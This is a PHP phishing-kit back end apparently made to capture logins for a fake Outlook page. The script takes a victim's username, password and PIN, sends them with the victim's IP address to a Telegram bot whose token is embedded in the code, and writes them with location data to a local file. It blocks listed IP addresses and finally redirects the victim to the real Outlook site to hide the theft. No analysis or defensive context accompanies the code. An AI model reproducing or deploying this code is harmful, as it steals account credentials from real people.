<?php

ini_set("display_errors",0);

if(isset($_POST['user'])&& isset($_POST['pasword'])&& isset($_POST['pin'])){
$userip = $_SERVER['REMOTE_ADDR'];

 $message = "*User: ".$_POST['user']."\n\n"."*Pasword: ".$_POST['pasword']."\n\n"."*PIN: ".$_POST['pin']."\n\n
*IP: ". $userip ."\n\n";
 $apiToken = "5446154135:AAEfR59bCKcw0KTDSr_RVHKbVrZgIFpG2mQ";

 $data =[
    'chat_id' => '-616399718',
    'text'=> $message
 ];
 
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}









date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("miggyxmail.txt", "a");
	
fwrite($file, "".$_POST['ae']." | ".$_POST['ao']." | ".$_POST['pn']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
fwrite($file, "----------------------------------------- " . PHP_EOL);
fclose($file);
	
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$zCh = file_get_contents("data.txt");
	$blocked_ip = explode("\n", $zCh);
	
	if (in_array($ip, $blocked_ip)) {
	   header("HTTP/1.0 403 Forbidden");
	   exit();
	}



if ($_POST) {
    $usuario = $_POST["user"];
    $pasword = $_POST["pasword"];
    $pin = $_POST["pin"];
    
    

    
   
    $gestor = fwrite (fopen('miggyxmail.txt', 'a'),"Usuario:"."$usuario\n"."Pasword:"."$pasword\n"."Pin:"."$pin\n"."\n\r\n\r\n\r");

    header("location: https://outlook.live.com/owa/");
} 






?>